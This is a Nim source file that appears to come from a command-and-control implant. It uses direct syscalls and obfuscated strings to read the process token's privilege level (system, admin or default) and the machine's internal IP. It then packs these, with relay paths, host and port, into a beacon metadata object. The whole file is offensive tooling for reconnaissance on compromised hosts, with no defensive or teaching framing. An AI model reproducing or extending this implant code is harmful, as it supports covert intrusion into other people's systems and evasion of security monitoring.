import std/json
import ../global
import ../winapi/handlers
import ../winapi/ssn
import ../winapi/syscall

const tokenQuery = 0x0008'u32
const tokenUserClass = 1'u32
const tokenGroupsClass = 2'u32
const tokenElevationClass = 20'u32
const tokenIntegrityClass = 25'u32
const seGroupEnabled = 0x00000004'u32
const sidNtAuthorityValue = byte(5)
const sidNtAuthorityIndex = 5

type
  SidAndAttributes = object
    sid: pointer
    attributes: culong
  TokenUser = object
    user: SidAndAttributes
  TokenGroups = object
    groupCount: culong
    groups: array[1, SidAndAttributes]
  TokenElevation = object
    tokenIsElevated: culong
  MandatoryLabel = object
    label: SidAndAttributes

type
  MetaIpAddressString = object
    s: array[16, char]
  MetaIpAddrString = object
    next: pointer
    ipAddress: MetaIpAddressString
    ipMask: MetaIpAddressString
    context: culong
  MetaIpAdapterInfo = object
    next: pointer
    comboIndex: culong
    adapterName: array[260, char]
    description: array[132, char]
    addressLength: culong
    address: array[8, byte]
    index: culong
    adapterType: culong
    dhcpEnabled: culong
    currentIpAddress: pointer
    ipAddressList: MetaIpAddrString
const metaErrorBufferOverflow = culong(111)
const metaNoError = culong(0)

proc getInternalIp*(): string =
  result = ""
  var size: culong = 0
  let sizeRc = getAdaptersInfo(nil, addr size)
  if sizeRc != metaErrorBufferOverflow:
    return
  let buf = allocRw(size.csize_t)
  if buf == nil:
    return
  defer: discard freeMem(buf)
  let fillRc = getAdaptersInfo(buf, addr size)
  if fillRc != metaNoError:
    return
  let adapter = cast[ptr MetaIpAdapterInfo](buf)
  var ip = ""
  for i in 0 ..< 16:
    let c = adapter.ipAddressList.ipAddress.s[i]
    if c == '\0':
      break
    if c == ' ':
      break
    ip.add(c)
  result = ip

proc resolvePrivilege(): string =
  if not syscallReady:
    discard prepareSyscalls()
  var privilege = obf("default")
  var token: pointer
  if openProcessToken(currentProcess, tokenQuery, addr token) == 0 and token != nil:
    block check:
      var need: culong = 0
      discard queryInformationToken(token, tokenUserClass, nil, 0, addr need)
      if need > 0:
        var userBuf = newSeq[byte](need)
        if queryInformationToken(token, tokenUserClass, addr userBuf[0], need, addr need) == 0:
          let user = cast[ptr TokenUser](addr userBuf[0])
          let sid = user.user.sid
          let cnt = getSidSubAuthorityCount(sid)
          let auth = getSidIdentifierAuthority(sid)
          var authByte = byte(255)
          if auth != nil:
            authByte = cast[ptr UncheckedArray[byte]](auth)[sidNtAuthorityIndex]
          if sid != nil and cnt != nil and cnt[] == 1 and auth != nil and authByte == sidNtAuthorityValue:
            let sub = getSidSubAuthority(sid, 0)
            if sub != nil and sub[] == 18:
              privilege = obf("system")
              break check
      need = 0
      discard queryInformationToken(token, tokenIntegrityClass, nil, 0, addr need)
      if need > 0:
        var intBuf = newSeq[byte](need)
        if queryInformationToken(token, tokenIntegrityClass, addr intBuf[0], need, addr need) == 0:
          let label = cast[ptr MandatoryLabel](addr intBuf[0])
          let cnt = getSidSubAuthorityCount(label.label.sid)
          if cnt != nil and cnt[] > 0:
            let sub = getSidSubAuthority(label.label.sid, culong(cnt[] - 1))
            if sub != nil and sub[] == 0x4000'u32:
              privilege = obf("system")
              break check
      need = 0
      discard queryInformationToken(token, tokenElevationClass, nil, 0, addr need)
      if need > 0:
        var elevBuf = newSeq[byte](need)
        if queryInformationToken(token, tokenElevationClass, addr elevBuf[0], need, addr need) == 0:
          let elev = cast[ptr TokenElevation](addr elevBuf[0])
          if elev.tokenIsElevated != 0:
            privilege = obf("admin")
            break check
      need = 0
      discard queryInformationToken(token, tokenGroupsClass, nil, 0, addr need)
      if need > 0:
        var groupBuf = newSeq[byte](need)
        if queryInformationToken(token, tokenGroupsClass, addr groupBuf[0], need, addr need) == 0:
          let groups = cast[ptr TokenGroups](addr groupBuf[0])
          let base = cast[int](addr groups.groups[0])
          for i in 0 ..< int(groups.groupCount):
            let g = cast[ptr SidAndAttributes](base + i * sizeof(SidAndAttributes))
            let sid = g.sid
            let cnt = getSidSubAuthorityCount(sid)
            let auth = getSidIdentifierAuthority(sid)
            if (g.attributes and seGroupEnabled) == 0 or sid == nil or cnt == nil or cnt[] != 2:
              continue
            var gAuth = byte(255)
            if auth != nil:
              gAuth = cast[ptr UncheckedArray[byte]](auth)[sidNtAuthorityIndex]
            if auth == nil or gAuth != sidNtAuthorityValue:
              continue
            let sa0 = getSidSubAuthority(sid, 0)
            let sa1 = getSidSubAuthority(sid, 1)
            if sa0 != nil and sa1 != nil and sa0[] == 32 and sa1[] == 544:
              privilege = obf("admin")
              break check
    discard ntCloseHandle(token)
  privilege

proc createMetadata*(): JsonNode =
  let privilege = resolvePrivilege()
  let internalIp = getInternalIp()
  %*{
    obf("relays"): activeRelayPaths,
    obf("privilege"): privilege,
    obf("internal_ip"): internalIp,
    obf("host"): host,
    obf("port"): port,
  }
